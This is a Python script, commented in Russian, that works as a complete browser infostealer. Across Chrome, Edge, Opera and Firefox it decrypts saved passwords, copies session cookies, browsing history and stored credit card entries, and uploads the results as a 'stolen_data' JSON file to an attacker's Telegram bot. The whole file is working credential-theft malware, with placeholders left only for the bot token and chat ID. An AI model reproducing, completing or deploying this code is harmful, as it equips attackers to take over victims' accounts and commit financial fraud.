import os
import requests
import json
import sqlite3
import shutil
import base64
from datetime import datetime
from Cryptodome.Cipher import AES
from win32 import win32crypt

# Конфигурация Telegram бота
TELEGRAM_BOT_TOKEN = "TOKEN"
TELEGRAM_CHAT_ID = "ID"

def get_browser_data():
    collected_data = {}
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
    }

    for browser, path in browsers.items():
        try:
            if os.path.exists(path):
                data = {
                    "passwords": convert_to_serializable(extract_passwords(browser, path)),
                    "cookies": convert_to_serializable(extract_cookies(browser, path)),
                    "history": convert_to_serializable(extract_history(browser, path)),
                    "credit_cards": convert_to_serializable(extract_credit_cards(browser, path))
                }
                collected_data[browser] = data
        except Exception as e:
            collected_data[browser] = f"Error: {str(e)}"

    return collected_data

def get_encryption_key(browser_path):
    """Получаем ключ шифрования из Local State"""
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Удаляем DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Ошибка получения ключа: {str(e)}")
        return None

def decrypt_password(password, key):
    """Дешифруем пароль используя AES-GCM"""
    try:
        iv = password[3:15]
        ciphertext = password[15:-16]
        tag = password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode("utf-8")
    except Exception as e:
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode("utf-8")
        except:
            return f"Ошибка дешифровки: {str(e)}"

def extract_passwords(browser, path):
    passwords = []
    if browser in ["Chrome", "Edge", "Opera"]:
        encryption_key = get_encryption_key(path)
        login_db = os.path.join(path, "Default", "Login Data")
        if os.path.exists(login_db) and encryption_key:
            temp_db = "temp_login_db"
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                decrypted_password = decrypt_password(row[2], encryption_key) if row[2] else ""
                passwords.append({
                    "url": row[0],
                    "username": row[1],
                    "password": decrypted_password
                })
            conn.close()
            os.remove(temp_db)

    elif browser == "Firefox":
        profiles = [d for d in os.listdir(path) if d.endswith(".default")]
        for profile in profiles:
            logins_json = os.path.join(path, profile, "logins.json")
            if os.path.exists(logins_json):
                with open(logins_json, "r") as f:
                    data = json.load(f)
                    passwords.extend(data.get("logins", []))
    return passwords

def convert_to_serializable(data):
    """Дополненная обработка исключений"""
    if isinstance(data, bytes):
        try:
            return data.decode('utf-8', errors='replace')
        except:
            return "[BINARY DATA]"
    elif isinstance(data, list):
        return [convert_to_serializable(item) for item in data]
    elif isinstance(data, dict):
        return {k: convert_to_serializable(v) for k, v in data.items()}
    return data

def extract_cookies(browser, path):
    cookies = []
    try:
        if browser in ["Chrome", "Edge", "Opera"]:
            cookie_db = os.path.join(path, "Default", "Network", "Cookies")
            if os.path.exists(cookie_db):
                temp_db = "temp_cookies_db"
                shutil.copy2(cookie_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies")
                for row in cursor.fetchall():
                    cookies.append({
                        "domain": row[0],
                        "name": row[1],
                        "value": row[2],
                        "path": row[3],
                        "expires": row[4]
                    })
                conn.close()
                os.remove(temp_db)

        elif browser == "Firefox":
            profiles = [d for d in os.listdir(path) if d.endswith(".default")]
            for profile in profiles:
                cookies_db = os.path.join(path, profile, "cookies.sqlite")
                if os.path.exists(cookies_db):
                    temp_db = "temp_firefox_cookies"
                    shutil.copy2(cookies_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
                    for row in cursor.fetchall():
                        cookies.append({
                            "domain": row[0],
                            "name": row[1],
                            "value": row[2],
                            "path": row[3],
                            "expires": row[4]
                        })
                    conn.close()
                    os.remove(temp_db)
    except Exception as e:
        cookies.append(f"Error: {str(e)}")
    return cookies

def extract_history(browser, path):
    history = []
    try:
        if browser in ["Chrome", "Edge", "Opera"]:
            history_db = os.path.join(path, "Default", "History")
            if os.path.exists(history_db):
                temp_db = "temp_history_db"
                shutil.copy2(history_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                for row in cursor.fetchall():
                    history.append({
                        "url": row[0],
                        "title": row[1],
                        "visit_count": row[2],
                        "last_visit": row[3]
                    })
                conn.close()
                os.remove(temp_db)

        elif browser == "Firefox":
            profiles = [d for d in os.listdir(path) if d.endswith(".default")]
            for profile in profiles:
                places_db = os.path.join(path, profile, "places.sqlite")
                if os.path.exists(places_db):
                    temp_db = "temp_firefox_history"
                    shutil.copy2(places_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
                    for row in cursor.fetchall():
                        history.append({
                            "url": row[0],
                            "title": row[1],
                            "visit_count": row[2],
                            "last_visit": row[3]
                        })
                    conn.close()
                    os.remove(temp_db)
    except Exception as e:
        history.append(f"Error: {str(e)}")
    return history

def extract_credit_cards(browser, path):
    cards = []
    try:
        if browser in ["Chrome", "Edge", "Opera"]:
            cards_db = os.path.join(path, "Default", "Web Data")
            if os.path.exists(cards_db):
                temp_db = "temp_cc_db"
                shutil.copy2(cards_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cursor.fetchall():
                    cards.append({
                        "name": row[0],
                        "exp_month": row[1],
                        "exp_year": row[2],
                        "number": row[3]  # Зашифровано, требуется дешифровка
                    })
                conn.close()
                os.remove(temp_db)
    except Exception as e:
        cards.append(f"Error: {str(e)}")
    return cards

def send_to_telegram(data):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    filename = f"stolen_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    
    with open(filename, "rb") as f:
        requests.post(url, 
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": "Stolen browser data"},
                    files={"document": f})
    os.remove(filename)

if __name__ == "__main__":
    stolen_data = get_browser_data()
    send_to_telegram(stolen_data)
